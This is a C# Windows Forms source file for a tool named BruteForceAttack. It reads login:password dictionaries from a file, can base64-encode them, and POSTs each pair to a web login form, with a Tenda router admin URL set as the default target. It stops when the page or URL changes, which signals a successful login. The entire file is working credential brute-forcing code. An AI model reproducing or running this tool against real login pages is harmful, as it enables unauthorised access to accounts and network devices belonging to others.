using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BruteForceAttack
{
    public partial class Form1 : Form
    {
        private Credentials credentials = new Credentials();
        
        public Form1()
        {
            InitializeComponent();
            webBrowser.Navigate(textBoxUrl.Text);
            richTextBoxDocumentText.Text = webBrowser.DocumentText;
            comboBoxEncode.SelectedIndex = 0;
            comboBoxEncodeTypeDictionary.SelectedIndex = 0;
            comboBoxStopConditions.SelectedIndex = 0;
            textBoxPostUrl.Text = "http://tendawifi.com/login/Auth"; // for testing purposes 
        }

        private void updatePostURL()
        {
            string login = (checkBoxLogin.Checked) ?
                encodeString(textBoxLogin.Text, comboBoxEncode.SelectedIndex) :
                textBoxLogin.Text;

            string password = (checkBoxPassword.Checked) ?
                encodeString(textBoxPassword.Text, comboBoxEncode.SelectedIndex) :
                textBoxPassword.Text;


            if (!String.IsNullOrEmpty(textBoxLogin.Text) && !String.IsNullOrEmpty(textBoxPassword.Text))
                textBoxPostString.Text = "login=" + login + "&password=" + password;

            else if (!String.IsNullOrEmpty(textBoxLogin.Text))
                textBoxPostString.Text = "login=" + login;

            else if (!String.IsNullOrEmpty(textBoxPassword.Text))
                textBoxPostString.Text = "password=" + password;
            else
                textBoxPostString.Text = "";
        }

        private string encodeString(string plaintext, int index)
        {
            switch (index)
            {
                case 1:
                    return EncodeUtilities.base64Encode(plaintext);
                    
                default: return plaintext;
            }
        }


        private void buttonGo_Click(object sender, EventArgs e)
        {
            webBrowser.Navigate(textBoxUrl.Text);
        }

        private void Navigate(string address)
        {
            if (String.IsNullOrEmpty(address)) return;
            if (address.Equals("about:blank")) return;
            if (!address.StartsWith("http://") &&
                !address.StartsWith("https://"))
            {
                address = "http://" + address;
            }
            try
            {
                webBrowser.Navigate(new Uri(address));
            }
            catch (System.UriFormatException)
            {
                return;
            }
        }

        private void textBoxUrl_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Navigate(textBoxUrl.Text);
            }
        }

        private void buttonPost_Click(object sender, EventArgs e)
        {
            string postData = textBoxPostString.Text;
            string postUrl = textBoxPostUrl.Text;
            byte[] postDataByte = Encoding.UTF8.GetBytes(postData);
            string AdditionalHeaders = "Content-Type: application/x-www-form-urlencoded" + Environment.NewLine;
            webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders);
        }

        private void webBrowser_Navigated(object sender, WebBrowserNavigatedEventArgs e)
        {
            if (textBoxUrl.Text != e.Url.ToString())
            {
                textBoxUrl.Text = e.Url.ToString();
                richTextBoxDocumentText.Text = webBrowser.DocumentText;
            }
        }

        private void buttonPrevious_Click(object sender, EventArgs e)
        { 
            if (webBrowser.CanGoBack)
                webBrowser.GoBack();
        }

        private void buttonNext_Click(object sender, EventArgs e)
        {
            if (webBrowser.CanGoForward)
                webBrowser.GoForward();
        }

        private void buttonRefresh_Click(object sender, EventArgs e)
        {
            webBrowser.Refresh();
        }

        private void textBoxLogin_TextChanged(object sender, EventArgs e)
        {
            updatePostURL();
        }

        private void textBoxPassword_TextChanged(object sender, EventArgs e)
        {
            updatePostURL();
        }

        private void checkBoxLogin_CheckedChanged(object sender, EventArgs e)
        {
            updatePostURL();
        }

        private void checkBoxPassword_CheckedChanged(object sender, EventArgs e)
        {
            updatePostURL();
        }

        private void comboBoxEncode_SelectedIndexChanged(object sender, EventArgs e)
        {
            updatePostURL();
        }

        private void comboBoxStopConditions_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxStopConditions.SelectedIndex == 1)
                textBoxRequestedUrl.Visible = true;
            else
                textBoxRequestedUrl.Visible = false;
        }

        private void buttonLoadFromFile_Click(object sender, EventArgs e)
        {
            openFileDialog.InitialDirectory = "c:\\";
            openFileDialog.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            openFileDialog.FilterIndex = 1;
            openFileDialog.RestoreDirectory = true;

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = openFileDialog.FileName;
                credentials.loadCredentialsFormFile(filePath);
                richTextBoxLog.AppendText(getTime() + ' ' + "-! Dictionary loaded from file !-\n");
                richTextBoxLog.AppendText(credentials.credentialsListToString()); // load to log container
            }
        }

        private string getTime()
        {
            return DateTime.Now.ToString("hh:mm:ss");
        }

        private async Task PageLoad(int timeOut, int delay)
        {
            TaskCompletionSource<bool> pageLoaded = null;
            pageLoaded = new TaskCompletionSource<bool>();
            int timeElapsed = 0;
            webBrowser.DocumentCompleted += (s, e) =>
            {
                if (webBrowser.ReadyState != WebBrowserReadyState.Complete) return;
                if (pageLoaded.Task.IsCompleted) return; pageLoaded.SetResult(true);
            };
         
            while (pageLoaded.Task.Status != TaskStatus.RanToCompletion)
            {
                await Task.Delay(delay);
                timeElapsed++;
                if (timeElapsed >= timeOut * 100) 
                    pageLoaded.TrySetResult(true);
            }
        }

        private async void buttonStart_Click(object sender, EventArgs e)
        {
            string postUrl = textBoxPostUrlDictionary.Text;
            string AdditionalHeaders = "Content-Type: application/x-www-form-urlencoded" + Environment.NewLine;
            string documentTextStartPage = webBrowser.DocumentText;
            string startUrl = webBrowser.Url.ToString();

            LinkedList<Credential> encodedCredentials = encodeCredentials();
            
            if (!encodedCredentials.Equals(credentials.ListOfCredentials))
            {
                richTextBoxLog.AppendText("\n" + getTime() + " Dictionary after encoding [login:password]" + Environment.NewLine);
                richTextBoxLog.AppendText(listToString(encodedCredentials));
            }

            foreach (var item in encodedCredentials)
            {
                string postData = textBoxPostStringSyntax.Text.Replace("$0", item.Login).Replace("$1", item.Password);
                byte[] postDataByte = Encoding.UTF8.GetBytes(postData);
                
               // Task post = Task.Factory.StartNew(() => webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders));
               // post.Wait();

                try
                {
                    webBrowser.Navigate(postUrl, "", postDataByte, AdditionalHeaders);
                    await PageLoad(1000, int.Parse(textBoxPostDelay.Text));
                }
                catch (Exception exception)
                {
                    MessageBox.Show(exception.Message);
                }

                if (isStopCondition(comboBoxStopConditions.SelectedIndex, richTextBoxDocumentText.Text,
                                   textBoxRequestedUrl.Text, startUrl, webBrowser))
                {
                    MessageBox.Show(postData);
                    break;
                }
            }
        }

        private LinkedList<Credential> encodeCredentials()
        {
            LinkedList<Credential> encodedList = new LinkedList<Credential>();
            foreach (var item in credentials.ListOfCredentials)
            {
                if (!checkBoxLoginEncodeDictionary.Checked && !checkBoxPasswordEncodeDictionary.Checked) // none
                    return credentials.ListOfCredentials;

                else if (!checkBoxLoginEncodeDictionary.Checked && checkBoxPasswordEncodeDictionary.Checked) // only password
                    encodedList.AddLast(new Credential(
                                    item.Login,
                                    encodeString(item.Password, comboBoxEncodeTypeDictionary.SelectedIndex)));

                else if (checkBoxLoginEncodeDictionary.Checked && !checkBoxPasswordEncodeDictionary.Checked) // only login
                    encodedList.AddLast(new Credential(
                                    encodeString(item.Login, comboBoxEncodeTypeDictionary.SelectedIndex),
                                    item.Password));
                else // both
                    encodedList.AddLast(new Credential(
                                        encodeString(item.Login, comboBoxEncodeTypeDictionary.SelectedIndex),
                                        encodeString(item.Password, comboBoxEncodeTypeDictionary.SelectedIndex)));
            }
            return encodedList;
        }

        private string listToString(LinkedList<Credential> list)
        {
            StringBuilder builder = new StringBuilder(); 
            foreach (var item in list)
            {
                builder.AppendLine(item.Login + ':' + item.Password);
            }
            return builder.ToString();
        }

        private bool isStopCondition (int index, string documentTextStartPage, string destinationURL, string startUrl, WebBrowser webBrowser)
        {
            bool isStop = false;
            switch (index)
            {
                case 0:
                    isStop = webBrowser.DocumentText.Equals(documentTextStartPage) ? false : true; // param documentText of startingPage
                    break;
                case 1:
                    isStop = webBrowser.Url.ToString().Equals(destinationURL) ? true : false; // param = destinationURL 
                    break;
                case 2:
                    isStop = webBrowser.Url.ToString().Equals(startUrl) ? false : true; // param = startUrl
                    break;
            }
            return isStop;
        }
    }
}

